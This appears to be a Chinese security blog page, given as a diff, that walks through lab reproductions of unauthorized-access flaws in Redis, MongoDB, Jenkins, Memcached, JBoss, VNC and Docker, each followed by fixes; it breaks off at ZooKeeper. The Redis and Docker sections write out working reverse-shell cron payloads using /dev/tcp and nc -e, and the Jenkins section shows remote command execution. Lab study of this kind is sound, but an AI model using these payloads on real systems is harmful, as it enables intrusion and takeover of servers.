@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      常见未授权访问 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>常见未授权访问</h2>
+  <p class="post-date">2020-07-11</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>本文主要介绍和学习关于“未授权访问”漏洞；从字面了解到“未授权”指的是部署的系统未启用认证功能而被直接访问/操作的安全隐患/漏洞。</p>
+<p>感谢前人大佬整理,内容参考网上大佬文章整理，您也可直接<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103#toc-12">看这里</a>.漏洞环境参考<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">Vulhub</a>,部分环境根据漏洞影响范围来选择安装和搭建.</p>
+<p><img src="/images/Unauthorized/image-20200709163151943.png" alt="image-20200709163151943"></p>
+<center>虚拟机22G</center>
+
+
+<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以下环境基本基于centos 7虚拟机部署检测完成。</span><br><span class="line">1.Docker</span><br><span class="line">2.jdk 1.8</span><br><span class="line">3.docker-compose</span><br><span class="line">4.其他参考各漏洞环境搭建部分.</span><br></pre></td></tr></table></figure>
+
+<h4 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>
+<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tar xzvf redis-2.8.17.tar.gz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> redis-2.8.17</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> src/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp redis-server /usr/bin/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp redis-cli /usr/bin/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp redis.conf /etc/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> redis-server /etc/redis.conf</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200703144429633.png" alt="image-20200703144429633"></p>
+<p>1、连接Redis</p>
+<p>本地可下载客户端进行连接Redis进行getshell等操作</p>
+<p><img src="/images/Unauthorized/image-20200703144858785.png" alt="image-20200703144858785"></p>
+<p><img src="/images/Unauthorized/image-20200703144912904.png" alt="image-20200703144912904"></p>
+<center>如上图所示连接成功</center>
+2、getshell
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 攻击机执行nc监听</span></span><br><span class="line">nc -lvnp 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"> Redis客户端执行</span></span><br><span class="line">set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.144.141/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>还有其他方式进行反弹shell可网上参考</p>
+<p><img src="/images/Unauthorized/image-20200704093747944.png" alt="image-20200704093747944"></p>
+<center>getshell</center>
+
+
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、限制登录ip</p>
+<p>2、添加密码</p>
+<p>3、修改默认端口</p>
+<h4 id="MongoDB-未授权访问"><a href="#MongoDB-未授权访问" class="headerlink" title="MongoDB 未授权访问"></a>MongoDB 未授权访问</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​    开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
+<p>​    造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>
+<h5 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//镜像搜索</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker search mongodb</span></span><br><span class="line">//拉取镜像</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull mongo</span></span><br><span class="line">//显示mongo镜像</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker images mongo</span></span><br><span class="line">//创建新的容器</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker run -d -p 27017:27017 --name mongodb mongo</span></span><br><span class="line">//显示所有容器</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker ps -a</span></span><br></pre></td></tr></table></figure>
+
+<p>1、NoSQLBooster连接</p>
+<p><img src="/images/Unauthorized/image-20200704122547655.png" alt="image-20200704122547655"></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、MongoDB添加认证：MongoDB启动时添加–auth参数、为MongoDB添加用户</p>
+<p>2、启动时加入参数–bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</p>
+<h4 id="Jenkins-未授权访问"><a href="#Jenkins-未授权访问" class="headerlink" title="Jenkins 未授权访问"></a>Jenkins 未授权访问</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</p>
+<h5 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//安装并启动Jenkins服务</span><br><span class="line"><span class="meta">#</span><span class="bash"> rpm -ivh jenkins-2.7.3-1.1.noarch.rpm</span></span><br><span class="line">//修改默认端口</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/sysconfig/jenkins</span></span><br><span class="line">JENKINS_PORT=&quot;8089&quot;</span><br><span class="line">//jenkins服务启动</span><br><span class="line"><span class="meta">#</span><span class="bash"> service jenkins start</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706091405075.png" alt="image-20200706091405075"></p>
+<p><img src="/images/Unauthorized/image-20200706091522419.png" alt="image-20200706091522419"></p>
+<p>1、浏览器访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.142:8089/login?from=%2F</span><br><span class="line">//浏览器访问后输入文件内的密码</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /var/lib/jenkins/secrets/initialAdminPassword</span></span><br></pre></td></tr></table></figure>
+
+<p>2、未授权访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;系统</span><br><span class="line">http:&#x2F;&#x2F;172.16.144.142:8089&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706094611260.png" alt="image-20200706094611260"></p>
+<p>3、执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706095024778.png" alt="image-20200706095024778"></p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、版本升级</p>
+<p>2、添加认证，设置强密码复杂度及账号锁定</p>
+<p>3、禁止把Jenkins直接暴露在公网</p>
+<h4 id="Memcached-未授权访问"><a href="#Memcached-未授权访问" class="headerlink" title="Memcached 未授权访问"></a>Memcached 未授权访问</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。</p>
+<p>Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。 </p>
+<p> Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。 </p>
+<p> 本质上，它是一个简洁的key-value存储系统。 </p>
+<p>一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 </p>
+<h5 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//安装</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install memcached</span></span><br><span class="line">//启动</span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl status  memcached.service</span></span><br><span class="line">//查看默认配置</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/sysconfig/memcached</span></span><br></pre></td></tr></table></figure>
+
+<p>1、telnet连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 172.16.144.142 11211</span><br><span class="line">nc -vv 172.16.144.142 11211</span><br><span class="line">无需用户名密码，可以直接连接memcache</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706104012663.png" alt="image-20200706104012663"></p>
+<p><img src="/images/Unauthorized/image-20200706110511684.png" alt="image-20200706110511684"></p>
+<p>2、nmap检测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 11211 --script memcached-info 172.16.144.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706105609418.png" alt="image-20200706105609418"></p>
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>-设置Memchached只允许本地访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS=&quot;-l 127.0.0.1&quot;		//只允许本地访问</span><br></pre></td></tr></table></figure>
+
+<p>-禁止外网访问Memcached 11211端口</p>
+<h4 id="JBOSS-未授权访问"><a href="#JBOSS-未授权访问" class="headerlink" title="JBOSS 未授权访问"></a>JBOSS 未授权访问</h4><h5 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <code>http://ip:8080/jmx-console</code> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
+<h5 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>可参考JBoss漏洞介绍部分</p>
+<p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200702154251373.png" alt="image-20200702154251373"></p>
+<p>2、访问<code>JMX Console</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;或直接访问这个地址</span><br><span class="line">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;jmx-console&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200702154332658.png" alt="image-20200702154332658"></p>
+<p>3、部署远程war</p>
+<p><img src="/images/Unauthorized/image-20200702154524903.png" alt="image-20200702154524903"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入远程构造好的war的URL并点击“Invoke”</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200702154726454.png" alt="image-20200702154726454"></p>
+<h5 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、jmx控制页面访问添加访问验证</p>
+<p>2、JMX Console 安全配置</p>
+<h4 id="VNC-未授权访问"><a href="#VNC-未授权访问" class="headerlink" title="VNC 未授权访问"></a>VNC 未授权访问</h4><h5 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</p>
+<h5 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">需要用gnome桌面，如果服务器安装时使用的最小化安装，那么进行下面操作按章GNOME 桌面</span><br><span class="line">yum grouplist														# 列出的组列表里有GNOME Desktop</span><br><span class="line">yum groupinstall -y &quot;GNOME Desktop&quot;			# 安装</span><br><span class="line">systemctl set-default graphical.target  //设置成图形模式</span><br><span class="line">systemctl set-default multi-user.target  //设置成命令模式</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后重启即可，或者startx开启图形界面。第一次启动可能时间会长一点，耐心等待即可。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install tigervnc-server -y</span></span><br><span class="line">//新建服务配置模版</span><br><span class="line">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service</span><br><span class="line">vim /etc/systemd/system/vncserver@\:1.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=Remote desktop service (VNC)</span><br><span class="line">After=syslog.target network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">User=root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Clean any existing files <span class="keyword">in</span> /tmp/.X11-unix environment</span></span><br><span class="line">ExecStartPre=-/usr/bin/vncserver -kill %i</span><br><span class="line">ExecStart=/sbin/runuser -l root -c &quot;/usr/bin/vncserver %i&quot;</span><br><span class="line">PIDFile=/root/.vnc/%H%i.pid</span><br><span class="line">ExecStop=-/usr/bin/vncserver -kill %i</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>1、端口检测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> netstat -ant | grep 5901</span></span><br><span class="line">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 :::5901                 :::*                    LISTEN</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709155404841.png" alt="image-20200709155404841"></p>
+<p>2、取消鉴权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//先停掉服务</span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo vncserver -<span class="built_in">kill</span> :1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vncserver :1 -SecurityTypes=none</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709162439146.png" alt="image-20200709162439146"></p>
+<h5 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、添加用户认证</p>
+<p>2、以最小普通权限身份运行操作系统</p>
+<h4 id="Docker-未授权访问"><a href="#Docker-未授权访问" class="headerlink" title="Docker 未授权访问"></a>Docker 未授权访问</h4><h5 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​        Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p>
+<p>​        Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
+<h5 id="漏洞验证-6"><a href="#漏洞验证-6" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//pip安装</span><br><span class="line">[root@localhost ~]# yum -y install epel-release</span><br><span class="line">[root@localhost ~]# yum -y install python-pip</span><br><span class="line">[root@localhost ~]# pip install --upgrade pip</span><br><span class="line">[root@localhost ~]# pip install docker-compose</span><br><span class="line">[root@localhost ~]# yum install docker</span><br><span class="line">mkdir docker</span><br><span class="line">cd docker </span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile</span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml</span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class="line">ERROR: Couldn&#x27;t connect to Docker daemon at http+docker://localhost - is it running?</span><br><span class="line"></span><br><span class="line">If it&#x27;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br><span class="line">//报以上报错因服务未启动</span><br><span class="line">[root@localhost docker]# sudo systemctl start docker</span><br><span class="line">//编译并启动</span><br><span class="line">[root@localhost docker]# docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706155443054.png" alt="image-20200706155443054"></p>
+<p>1、未授权访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;nmap端口检测</span><br><span class="line">➜  Desktop sudo nmap -sS -p 1-65535 -v 172.16.144.135</span><br><span class="line">&#x2F;&#x2F;获取远程docker信息</span><br><span class="line">➜  Desktop docker -H tcp:&#x2F;&#x2F;172.16.144.135:2375 version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200706155712528.png" alt="image-20200706155712528"></p>
+<p>2、反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure>
+
+<p>启动容器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://172.16.144.135:2375 run -id -v /etc/crontabs:/tmp alpine:latest</span><br><span class="line">//主要查看images id值</span><br><span class="line">docker -H tcp://172.16.144.135:2375 ps</span><br><span class="line">//进入进程shell</span><br><span class="line">docker -H tcp://172.16.144.135:2375 exec -it fd986b9a93f2 sh		//image id 必须本地拉取新的id值</span><br><span class="line">//新建计划任务</span><br><span class="line">echo &#x27;* * * * * /usr/bin/nc 172.16.144.135 9988 -e /bin/sh&#x27; &gt;&gt; /tmp/root</span><br><span class="line">//获取计划任务信息列表</span><br><span class="line">cat /tmp/root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707103740566.png" alt="image-20200707103740566"></p>
+<p>反弹成功</p>
+<p><img src="/images/Unauthorized/image-20200707103806562.png" alt="image-20200707103806562"></p>
+<p>3、未授权访问检测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//此脚本可以检测未授权访问漏洞，反弹shell未实验</span><br><span class="line">https://github.com/Tycx2ry/docker_api_vul</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、2375端口做网络访问控制</p>
+<p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p>
+<h4 id="ZooKeeper-未授权访问"><a href="#ZooKeeper-未授权访问" class="headerlink" title="ZooKeeper 未授权访问"></a>ZooKeeper 未授权访问</h4><h5 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>
+<h5 id="漏洞验证-7"><a href="#漏洞验证-7" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
